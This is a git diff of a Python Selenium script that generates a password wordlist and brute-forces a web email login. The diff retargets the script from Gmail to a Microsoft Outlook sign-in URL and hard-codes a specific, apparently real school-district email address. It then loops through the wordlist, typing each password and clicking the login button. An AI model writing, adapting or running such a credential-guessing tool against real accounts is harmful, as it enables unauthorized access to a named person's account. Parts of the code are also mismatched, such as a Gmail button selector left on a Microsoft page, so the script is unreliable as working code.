@@ -2,6 +2,8 @@ from itertools import product
 import string
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
+import time
 x = ""
 #This checks to see if you already got a list to avoid making a whole new list which takes forever
 print("Do you have list already? Y/N")
@@ -24,30 +26,28 @@ if x == "N" or "n":
       file_open.write('\n')
       counter+=1
   print("Wordlist of {} passwords created".format(counter))
-# Path to your Chromedriver
-chromedriver_path = '/path/to/chromedriver'
-# Set up the Chrome browser
-options = webdriver.ChromeOptions()
-options.add_argument('headless')  # Run in headless mode (no GUI)
-driver = webdriver.Chrome(service_log_path='chromedriver.log', options=options)
-# Navigate to Gmail's login page and find the email field
-driver.get('https://accounts.google.com/signin')
-email_field = driver.find_element_by_name('identifier')
+driver = webdriver.Chrome(executable_path="venv/lib/python3.10/site-packages/chromedriver_binary")
+# Input the email website 
+driver.get('https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=89141bdc-e41c-f4ab-d9bb-243ff8d08f0f&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=638201053764908602.8ea4a557-3822-4f3b-a983-79f4c595d035&state=DYs7FoAwCMCoPo-DxQKlHAc_XR29vgzJkpcCAGuyJIVSYJ1Ho4OUrYvT6NT28YSEqmGmhjL5xPDBaD7lUtebWEu-W32_qD8&sso_reload=true')
+time.sleep(30)
+email_field = driver.find_element(By.XPATH, '//*[@id="i0116"]')
 # Input your email address and press Enter to proceed to the next page
-email_field.send_keys('youremail@gmail.com')
-email_field.send_keys(Keys.RETURN)
+email_field.send_keys('24khale@go.dsdmail.net')
+next_buttonTwo = driver.find_element(By.XPATH, '//*[@id="idSIButton9"]')
+next_buttonTwo.click()
 # Define the path to your wordlist file
 wordlist_path = 'Wordlist.txt'
 # Open the wordlist file and try each password
+time.sleep(30)
 with open(wordlist_path, 'r') as f:
     for line in f:
         # Strip any newline characters from the word
         password = line.strip()
         # Find the password field and input the password
-        password_field = driver.find_element_by_name('password')
+        password_field = driver.find_element(By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input')
         password_field.send_keys(password)
         # Click the "Next" button to log in
-        next_button = driver.find_element_by_xpath("//button[@class='VfPpkd-LgbsSe']")
+        next_button = driver.find_element(By.XPATH, "//button[@class='VfPpkd-LgbsSe']")
         next_button.click()
         # Check if login was successful
         if "Enter a password" not in driver.page_source:
